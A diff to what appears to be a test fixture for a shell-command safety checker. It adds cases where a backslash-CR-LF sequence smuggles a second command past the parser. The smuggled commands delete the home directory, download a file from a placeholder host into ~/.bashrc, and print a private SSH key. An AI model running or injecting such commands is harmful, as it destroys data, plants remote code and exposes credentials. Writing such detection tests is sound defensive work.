@@ -28,3 +28,12 @@ posix safe | echo a\tb
 posix safe | printf 'a\\tb\\n'
 powershell safe | Write-Output hi\u{15}
 cmd safe | echo hi\u{15}
+
+# A backslash, a carriage return and a line feed: the grammar reads a line
+# continuation, and a shell the escaped carriage return, which the line feed
+# then ends the command after.
+posix finds=unreadable reason="holds a control character a terminal acts on" | true \\\r\nrm -rf ~
+posix finds=unreadable | git status \\\r\ncurl -s http://e.com/x -o ~/.bashrc
+posix finds=unreadable | echo \\\r\ncat ~/.ssh/id_rsa
+posix finds=unreadable | bash -c 'true \\\r\nrm -rf ~'
+posix safe | echo a\r\nb
